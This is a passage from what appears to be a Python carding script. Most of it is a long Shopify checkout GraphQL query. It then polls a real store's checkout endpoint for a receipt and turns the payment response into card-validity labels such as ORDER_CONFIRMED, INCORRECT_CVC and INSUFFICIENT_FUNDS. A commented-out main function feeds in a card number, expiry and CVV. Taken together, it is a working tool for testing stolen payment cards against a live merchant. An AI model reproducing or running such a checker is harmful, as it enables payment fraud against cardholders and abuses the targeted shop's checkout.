coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                  'variables': {
                      'receiptId': bill,
                      'sessionToken': x_checkout_one_session_token,
                  },
                  'operationName': 'PollForReceipt',
              }

              request = await session.post(
                  'https://shedknives.com/checkouts/unstable/graphql',
                  params=params,
                  headers=headers,
                  json=json_data,
              )


              # print(request.text)

              res_json = json.loads(request.text)
              result = res_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code')

              if "shopify_payments" in str(res_json):
                  return "ORDER_CONFIRMED"
              if  result  == 'CARD_DECLINED':
                  return "CARD_DECLINED"
              elif  result  == 'INCORRECT_NUMBER':
                  return "INCORRECT_NUMBER âš ï¸"
              elif  result  == 'GENERIC_ERROR':
                  return "GENERIC_ERROR âš ï¸"
              elif result == 'AUTHENTICATION_FAILED':
                  return "3DS"
              elif "FRAUD_SUSPECTED" in str(res_json):
                  return "FRAUD_SUSPECTED"
              elif "INCORRECT_ADDRESS" in str(res_json):
                  return "MISMATCHED_BILLING"
              elif "INCORRECT_ZIP" in str(res_json):
                  return "MISMATCHED ZIP"
              elif "INCORRECT_PIN" in str(res_json):
                  return "MISMATCHED_PIN"
              elif "insufficient_funds" in str(res_json):
                  return "INSUFFICIENT_FUNDS"
              elif "INSUFFICIENT_FUNDS" in str(res_json):
                  return "INSUFFICIENT_FUNDS"
              elif "INVALID_CVC" in str(res_json):
                  return "INVALID_CVC âš ï¸"
              elif "INCORRECT_CVC" in str(res_json):
                  return "INCORRECT_CVC âš ï¸"        
              if "CompletePaymentChallenge" in str(res_json):
                  return "3DS REQUIRED"
              elif result:
                  return result
              else:
                  return "MISMATCHED_BILLðŸŸ¢" 

          except Exception as e:
              # Catch any unexpected errors and return them as a short response
              return f"ERROR: {str(e)} âš ï¸"

# async def main():
#     card = ""
#     mes = ""
#     ano = ""
#     cvv = ""
#     async with httpx.AsyncClient() as session:
#         await create_shopify_charge(card, mes, ano, cvv, session)

# if __name__ == "__main__":
#     asyncio.run(main())
